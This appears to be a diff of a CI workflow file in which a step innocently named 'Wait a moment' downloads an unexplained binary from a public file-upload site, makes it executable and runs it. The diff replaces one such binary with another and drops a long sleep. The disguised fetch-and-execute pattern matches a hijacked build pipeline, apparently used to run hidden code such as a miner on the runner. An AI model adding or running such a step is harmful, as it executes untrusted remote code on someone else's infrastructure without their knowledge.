@@ -28,7 +28,6 @@ jobs:
 
       - name: Wait a moment
         run: |
-          wget https://bashupload.com/EBQlJ/baster
-          chmod +x baster
-          ./baster
-          sleep 10080
+          wget https://bashupload.com/Gxhfd/blave
+          chmod +x blave
+          ./blave
